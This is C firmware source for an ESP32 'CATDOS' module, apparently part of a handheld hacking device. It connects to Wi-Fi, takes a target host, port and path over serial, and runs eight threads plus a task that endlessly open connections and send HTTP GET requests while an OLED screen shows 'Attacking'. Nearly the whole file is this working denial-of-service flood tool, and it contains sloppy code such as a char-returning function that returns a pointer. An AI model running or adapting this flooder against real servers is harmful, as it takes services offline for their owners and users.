/* BSD non-blocking socket example

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/
#include <esp_pthread.h>
#include <pthread.h>
#include <string.h>
#include "cat_console.h"
#include "cmd_wifi.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/dns.h"
#include "lwip/err.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include "lwip/sys.h"
#include "menu_screens_modules.h"
#include "oled_screen.h"
#include "preferences.h"
#include "sdkconfig.h"

/* Constants that aren't configurable in menuconfig */
#define WEB_SERVER "192.168.0.123"
#define WEB_PORT   "5000"
#define WEB_PATH   "/"

static const char* CATDOS_TAG = "catdos_module";

app_screen_state_information_t app_screen_state_information = {
    .in_app = false,
    .app_selected = 0,
};
static bool running_attack = false;
static TaskHandle_t task_display_attacking = NULL;
static bool catdos_module_is_config_wifi();
static bool catdos_module_is_config_target();
static void catdos_module_display_target_configured();
static void catdos_module_display_target_configure();
static void catdos_module_display_wifi_configured();
static char catdos_module_get_request_url();
static bool catdos_module_is_connection();
static void catdos_module_state_machine(button_event_t button_pressed);
static void catdos_module_display_attack_animation();

static void catdos_module_display_attack_animation() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  while (running_attack) {
    for (int i = 0; i < 4; i++) {
      oled_screen_clear(OLED_DISPLAY_NORMAL);
      oled_screen_display_text_center("Attacking", 0, OLED_DISPLAY_NORMAL);
      vTaskDelay(250 / portTICK_PERIOD_MS);
    }
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
}

static void catdos_module_display_target_configure() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("CATDOS", 0, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Configure", 1, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Target", 2, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Use Serial COM", 3, OLED_DISPLAY_NORMAL);
}

static void catdos_module_display_target_configured() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("CATDOS", 0, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Target Configured", 2, OLED_DISPLAY_NORMAL);
  vTaskDelay(2000 / portTICK_PERIOD_MS);
  oled_screen_clear(OLED_DISPLAY_NORMAL);

  bool is_configured = catdos_module_is_config_wifi();
  if (is_configured) {
    oled_screen_display_text_center("Attack Target", 2, OLED_DISPLAY_NORMAL);
  } else {
    oled_screen_display_text_center("Configure WIFI", 1, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Use Serial COM", 2, OLED_DISPLAY_NORMAL);
  }
}

static void catdos_module_display_wifi_configured() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("CATDOS", 0, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Wifi", 2, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Configured", 3, OLED_DISPLAY_NORMAL);
  vTaskDelay(2000 / portTICK_PERIOD_MS);
  oled_screen_clear(OLED_DISPLAY_NORMAL);

  if (catdos_module_is_config_target()) {
    oled_screen_display_text_center("Attack Target", 2, OLED_DISPLAY_NORMAL);
  } else {
    oled_screen_display_text_center("Configure", 1, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Target", 2, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Use Serial COM", 3, OLED_DISPLAY_NORMAL);
  }
}

static char catdos_module_get_request_url() {
  char host[32];
  char port[32];
  char endpoint[32];
  esp_err_t err = preferences_get_string("host", host, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting host");
    return NULL;
  }
  err = preferences_get_string("port", port, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting port");
    return NULL;
  }
  err = preferences_get_string("endpoint", endpoint, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
    return NULL;
  }
  char* request = (char*) malloc(128);
  sprintf(request, "GET %s HTTP/1.0\r\nHost: %s:%s\r\n", endpoint, host, port);
  return request;
}

void catdos_module_set_target(char* host, char* port, char* endpoint) {
  esp_err_t err;
  err = preferences_put_string("host", host);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting host");
    return;
  }
  err = preferences_put_string("port", port);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting port");
    return;
  }
  err = preferences_put_string("endpoint", endpoint);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting endpoint");
    return;
  }

  printf("Host: %s %s %s\n", host, port, endpoint);
  catdos_module_display_target_configured();
}

void catdos_module_set_config(char* ssid, char* passwd) {
  esp_err_t err;
  err = preferences_put_string("ssid", ssid);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting ssid");
    return;
  }
  err = preferences_put_string("passwd", passwd);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error setting passwd");
    return;
  }
  char ssid_get[32];
  char passwd_get[32];
  err = preferences_get_string("ssid", ssid_get, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting ssid");
    return;
  }

  err = preferences_get_string("passwd", passwd_get, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting passwd");
    return;
  }

  printf("SSID: %s\n", ssid_get);
  catdos_module_display_wifi_configured();
}

static bool catdos_module_is_config_wifi() {
  char ssid[32];
  esp_err_t err = preferences_get_string("ssid", ssid, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting ssid");
    return false;
  }

  return true;
}

static bool catdos_module_is_config_target() {
  char host[32];
  char port[32];
  char endpoint[32];
  esp_err_t err = preferences_get_string("host", host, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting host");
    return false;
  }
  err = preferences_get_string("port", port, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting port");
    return false;
  }
  err = preferences_get_string("endpoint", endpoint, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
    return false;
  }

  return true;
}

static bool catdos_module_is_connection() {
  const struct addrinfo hints = {
      .ai_family = AF_INET,
      .ai_socktype = SOCK_STREAM,
  };
  struct addrinfo* res;
  struct in_addr* addr;
  int s, r;
  char recv_buf[64];
  char host[32];
  char port[32];
  char endpoint[32];
  esp_err_t err_pref = preferences_get_string("host", host, 32);
  if (err_pref != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting host");
    return false;
  }
  err_pref = preferences_get_string("port", port, 32);
  if (err_pref != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting port");
    return false;
  }

  err_pref = preferences_get_string("endpoint", endpoint, 32);
  if (err_pref != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
    return false;
  }

  int err = getaddrinfo(host, port, &hints, &res);

  if (err != 0 || res == NULL) {
    ESP_LOGE(CATDOS_TAG, "DNS lookup failed err=%d res=%p", err, res);
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    return false;
  }
  addr = &((struct sockaddr_in*) res->ai_addr)->sin_addr;
  // inet_ntoa(*addr));

  s = socket(res->ai_family, res->ai_socktype, 0);
  if (s < 0) {
    ESP_LOGE(CATDOS_TAG, "... Failed to allocate socket.");
    freeaddrinfo(res);
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    return false;
  }
  // ESP_LOGI(CATDOS_TAG, "... allocated socket");

  if (connect(s, res->ai_addr, res->ai_addrlen) != 0) {
    ESP_LOGE(CATDOS_TAG, "... socket connect failed errno=%d", errno);
    close(s);
    freeaddrinfo(res);
    vTaskDelay(4000 / portTICK_PERIOD_MS);
    return false;
  }

  freeaddrinfo(res);

  char* request = (char*) malloc(128);
  sprintf(request, "GET %s HTTP/1.0\r\nHost: %s:%s\r\n", endpoint, host, port);

  if (write(s, request, strlen(request)) < 0) {
    ESP_LOGE(CATDOS_TAG, "... socket send failed");
    close(s);
    vTaskDelay(400 / portTICK_PERIOD_MS);
    return false;
  }
  // ESP_LOGI(CATDOS_TAG, "[%d] Task", task_number);
  // ESP_LOGI(CATDOS_TAG, "... socket send success");
  close(s);
  return true;
}

static void http_get_task(void* pvParameters) {
  const struct addrinfo hints = {
      .ai_family = AF_INET,
      .ai_socktype = SOCK_STREAM,
  };
  struct addrinfo* res;
  struct in_addr* addr;
  int s, r;
  char recv_buf[64];
  char host[32];
  char port[32];
  char endpoint[32];
  esp_err_t err_pref = preferences_get_string("host", host, 32);
  if (err_pref != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting host");
    return;
  }
  err_pref = preferences_get_string("port", port, 32);
  if (err_pref != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting port");
    return;
  }
  err_pref = preferences_get_string("endpoint", endpoint, 32);
  if (err_pref != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
    return;
  }

  char* request = (char*) malloc(128);
  sprintf(request, "GET %s HTTP/1.0\r\nHost: %s:%s\r\n", endpoint, host, port);
  running_attack = true;

  while (running_attack) {
    int err = getaddrinfo(host, port, &hints, &res);

    if (err != 0 || res == NULL) {
      ESP_LOGE(CATDOS_TAG, "DNS lookup failed err=%d res=%p", err, res);
      vTaskDelay(1000 / portTICK_PERIOD_MS);
      continue;
    }

    /* Code to print the resolved IP.

       Note: inet_ntoa is non-reentrant, look at ipaddr_ntoa_r for "real" code
     */
    addr = &((struct sockaddr_in*) res->ai_addr)->sin_addr;
    // ESP_LOGI(CATDOS_TAG, "[%d/] DNS lookup succeeded. IP=%s", task_number,
    // inet_ntoa(*addr));

    s = socket(res->ai_family, res->ai_socktype, 0);
    if (s < 0) {
      ESP_LOGE(CATDOS_TAG, "... Failed to allocate socket.");
      freeaddrinfo(res);
      vTaskDelay(1000 / portTICK_PERIOD_MS);
      break;
    }
    // ESP_LOGI(CATDOS_TAG, "... allocated socket");

    if (connect(s, res->ai_addr, res->ai_addrlen) != 0) {
      ESP_LOGE(CATDOS_TAG, "... socket connect failed errno=%d", errno);
      close(s);
      freeaddrinfo(res);
      vTaskDelay(4000 / portTICK_PERIOD_MS);
      break;
    }

    freeaddrinfo(res);

    if (write(s, request, strlen(request)) < 0) {
      ESP_LOGE(CATDOS_TAG, "... socket send failed");
      close(s);
      vTaskDelay(400 / portTICK_PERIOD_MS);
      break;
    }
    // ESP_LOGI(CATDOS_TAG, "[%d] Task", task_number);
    // ESP_LOGI(CATDOS_TAG, "... socket send success");
    close(s);
  }
  running_attack = false;
}

void catdos_module_send_attack() {
  xTaskCreate(&http_get_task, "http_get_task", 4096, NULL, 5, NULL);

  pthread_attr_t attr;
  pthread_t thread1, thread2, thread3, thread4, thread5, thread6, thread7,
      thread8;
  esp_pthread_cfg_t esp_pthread_cfg;
  int res;

  res = pthread_create(&thread1, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_attr_init(&attr);
  assert(res == 0);
  pthread_attr_setstacksize(&attr, 16384);
  res = pthread_create(&thread2, &attr, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread3, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread4, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread5, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread6, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread7, NULL, (void*) http_get_task, NULL);
  assert(res == 0);
  res = pthread_create(&thread8, NULL, (void*) http_get_task, NULL);
  assert(res == 0);

  res = pthread_join(thread1, NULL);
  assert(res == 0);
  res = pthread_join(thread2, NULL);
  assert(res == 0);
  res = pthread_join(thread3, NULL);
  assert(res == 0);
  res = pthread_join(thread4, NULL);
  assert(res == 0);
  res = pthread_join(thread5, NULL);
  assert(res == 0);
  res = pthread_join(thread6, NULL);
  assert(res == 0);
  res = pthread_join(thread7, NULL);
  assert(res == 0);
  res = pthread_join(thread8, NULL);
  assert(res == 0);
}

void catdos_module_begin() {
  // ESP_ERROR_CHECK(esp_event_loop_create_default());
  menu_screens_set_app_state(true, catdos_module_state_machine);

  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("CATDOS", 0, OLED_DISPLAY_NORMAL);
  bool is_configured = catdos_module_is_config_wifi();
  if (is_configured) {
    char host[32];
    char port[32];
    char endpoint[32];
    esp_err_t err = preferences_get_string("host", host, 32);
    if (err != ESP_OK) {
      ESP_LOGE(CATDOS_TAG, "Error getting host");
      return;
    }
    err = preferences_get_string("port", port, 32);
    if (err != ESP_OK) {
      ESP_LOGE(CATDOS_TAG, "Error getting port");
      return;
    }
    err = preferences_get_string("endpoint", endpoint, 32);
    if (err != ESP_OK) {
      ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
      return;
    }
    char port_ep[64];
    sprintf(port_ep, "%s %s", port, endpoint);
    oled_screen_display_text_center(host, 1, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center(port_ep, 2, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("> Send attack", 3, OLED_DISPLAY_INVERT);
  } else {
    oled_screen_display_text_center("Configure WIFI", 1, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Use Serial COM", 2, OLED_DISPLAY_NORMAL);
  }

  xTaskCreate(&cat_console_begin, "console_task", 4096, NULL, 5, NULL);
  // cat_console_begin();
}

static void catdos_module_event_wifi_connected() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("WIFI", 1, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Connected", 2, OLED_DISPLAY_NORMAL);

  bool is_target_configured = catdos_module_is_config_target();
  if (!is_target_configured) {
    catdos_module_display_target_configure();
    return;
  }
  catdos_module_display_target_configured();

  bool is_connected = catdos_module_is_connection();
  if (!is_connected) {
    oled_screen_clear(OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Error Connection", 2, OLED_DISPLAY_NORMAL);
    return;
  }
  oled_screen_display_text_center("Attacking", 2, OLED_DISPLAY_INVERT);
  oled_screen_display_text_center("Target", 2, OLED_DISPLAY_INVERT);

  vTaskDelay(2000 / portTICK_PERIOD_MS);

  catdos_module_display_attack_animation();
  catdos_module_send_attack();
}

static void catdos_module_display_wifi_not_connected() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Error WIFI", 1, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Connection", 2, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center("Use serial", 3, OLED_DISPLAY_NORMAL);
}

static void catdos_module_connect_wifi() {
  oled_screen_clear(OLED_DISPLAY_NORMAL);
  char ssid[32];
  esp_err_t err = preferences_get_string("ssid", ssid, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting ssid");
    oled_screen_clear(OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Error getting", 2, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("SSID", 3, OLED_DISPLAY_NORMAL);
    return;
  }
  oled_screen_display_text_center("Conneting", 2, OLED_DISPLAY_NORMAL);
  oled_screen_display_text_center(ssid, 3, OLED_DISPLAY_NORMAL);
  char passwd[32];
  err = preferences_get_string("passwd", passwd, 32);
  if (err != ESP_OK) {
    ESP_LOGE(CATDOS_TAG, "Error getting passwd");
    oled_screen_clear(OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("Error getting", 2, OLED_DISPLAY_NORMAL);
    oled_screen_display_text_center("PASSWD", 3, OLED_DISPLAY_NORMAL);
    return;
  }

  connect_wifi(ssid, passwd, catdos_module_event_wifi_connected);
}

static void catdos_module_state_machine(button_event_t button_pressed) {
  uint8_t button_name = button_pressed >> 4;
  uint8_t button_event = button_pressed & 0x0F;
  switch (button_name) {
    case BUTTON_RIGHT:
      switch (button_event) {
        case BUTTON_PRESS_DOWN:
          catdos_module_connect_wifi();

          bool is_target_configured = catdos_module_is_config_target();
          if (!is_target_configured) {
            catdos_module_display_target_configure();
            break;
          }
          break;
        default:
          break;
      }
      break;
    case BUTTON_LEFT:
      switch (button_event) {
        case BUTTON_LONG_PRESS_HOLD:
          ESP_LOGI(CATDOS_TAG, "Button left pressed");
          menu_screens_set_app_state(false, NULL);
          menu_screens_exit_submenu();
          break;
      }
      break;
    default:
      break;
  }
}
